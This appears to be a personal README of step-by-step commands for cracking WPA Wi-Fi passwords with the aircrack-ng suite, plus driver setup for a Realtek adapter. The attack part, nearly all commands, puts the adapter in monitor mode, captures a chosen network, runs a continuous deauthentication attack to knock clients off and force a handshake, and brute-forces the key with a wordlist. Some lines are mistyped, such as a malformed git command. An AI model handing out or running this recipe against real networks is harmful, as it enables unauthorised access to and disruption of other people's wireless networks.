# aircrack-ng-

https://www.youtube.com/watch?v=77cWBybyvV4
// this is for quadcomm adapter

iwconfig
ifconfig
airmon-ng check kill
airmon-ng start wlan0
iwconfig
airodump-ng wlan0mon
ctri c
airodump-ng -cX -w capture -d MACADD wlan0mon 
new root
aireplay-ng --deauth 0 -a MACADD -c DEVICEMACADD wlan0mon 
wait for WPA hadshake then stop deauth

ls
wireshark capture-X.cap 
-filter for eapol
airmon-ng stop wlan0mon 
iwconfig 
aircrack-ng capture-X.cap -w /usr/share/dict/words

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

https://github.com/aircrack-ng/rtl8188eus
//instalation 

    sudo apt update
    sudo apt upgrade
    sudo apt-get dist-upgrade
    reboot
    sudo apt-get install linux-headers-$(uname -r)
    sudo apt install bc
    sudo apt-get install build-essential
    sudo apt-get install libelf-dev
    sudo apt install dkms
    sudo rmmod r8188eu.ko
    git https://github.com/drygdryg/rtl8188eus (This works for me joy)
    cd rtl8188eus
    sudo -i
    echo 'blacklist r8188eu'|sudo tee -a '/etc/modprobe.d/realtek.conf'
    reboot
    cd rtl8188eus
    sudo make && make install
    reboot


// enter monitor mode

$ sudo airmon-ng check kill
$ sudo ip link set <interface> down
$ sudo iw dev <interface> set type monitor

//enter manage mode 

$ sudo iw dev <interface> set type managed
service NetworkManager restart 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 

    
    To remove locked files 
    chmod a+rwx <filename>
